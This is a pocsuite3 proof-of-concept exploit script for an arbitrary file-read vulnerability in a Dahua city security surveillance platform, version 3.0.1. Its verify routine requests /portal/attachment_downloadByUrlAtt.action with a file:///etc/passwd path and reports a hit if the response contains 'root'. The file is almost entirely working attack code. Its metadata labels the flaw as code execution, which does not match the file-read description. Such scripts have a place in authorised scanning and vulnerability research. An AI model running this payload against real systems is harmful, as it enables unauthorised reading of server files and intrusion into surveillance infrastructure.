from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '大华 城市安防监控系统平台管理-任意文件读取'
    appName = '大华'
    appVersion = '3.0.1'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''大华城市安防监控系统平台管理存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd"
            r = requests.get(url=target,timeout=5,verify=False)
            if r.status_code == 200 and "root" in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['payload'] = "/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd"
                return self.parse_output(result)
        except:
            return
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)